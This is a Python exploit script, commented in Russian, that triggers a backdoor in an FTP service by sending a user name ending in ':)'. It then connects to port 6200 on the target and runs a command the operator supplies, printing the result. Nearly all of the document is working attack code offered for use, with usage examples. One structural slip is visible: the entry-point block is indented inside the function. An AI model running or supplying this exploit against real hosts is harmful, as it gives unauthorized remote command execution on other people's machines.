#!/usr/bin/python3
import socket
import sys
import time

# Инициируем функцию в которой будет заложена логика эксплуатации
def exploit(ip, port, command):

    try:
        print('[*] Попытка эксплуатации...')
        # Создаем обычное TCP соединение используя IP адрес и порт
        ftp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ftp_socket.connect((ip, port))

        # Попытка аутентификации на уязвимом узле
        #Аутентифицируемся с невалидными кредами
        ftp_socket.send(b'USER anonymous:)\n')
        ftp_socket.send(b'PASS anonymous\n')
        # Создаем искуственную задержку перед закрытием соединения
        time.sleep(2)
        ftp_socket.close()
        print('[+] Подлючение прошло успешно')

    except Exception:
        print('[!] Неудачное подключение к %s' % ip)

    try:
        print('[*] Попытка подключения к бэкдору - открытая дверь, которую мы заведомо создали...')
        # Создание стандартного TCP соединения
        backdoor_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        backdoor_socket.connect((ip, 6200))
        print('[+] Подлючение к бэкдору на  %s:6200' % ip)
        # Формирование переменной содержащей команду для исполнения на хосте жертвы
        command = str.encode(command + '\n')
        # Отправка сформированной команды
        backdoor_socket.send(command)
        # Получение результата и запись его в переменную
        response = backdoor_socket.recv(1024).decode('utf-8')
        # Вывод результата в консоль
        print('[+] Response:\n', response, sep='')
        # Закрытие сетевого соединения
        backdoor_socket.close()

    except Exception:
        print('[!] Неудалось подлючиться к созданному бэкдору на  %s:6200' % ip)


    if __name__ == '__main__':
        # Если пользователь ввел недостатоное кол-во аргументов для работы с утилитой то наша проверка ниже выведет хелп
        if len(sys.argv) < 4:
            print('Шаблон использования: python exploit.py <IP address> <port> <command>')
            print('Пример использования: python exploit.py 192.168.1.10 21 whoami')

        else:
            # Если пользователь ввел все необходимые аргументы то мы их передаем в функцию для эксплуатации
            exploit(sys.argv[1], int(sys.argv[2]), sys.argv[3])
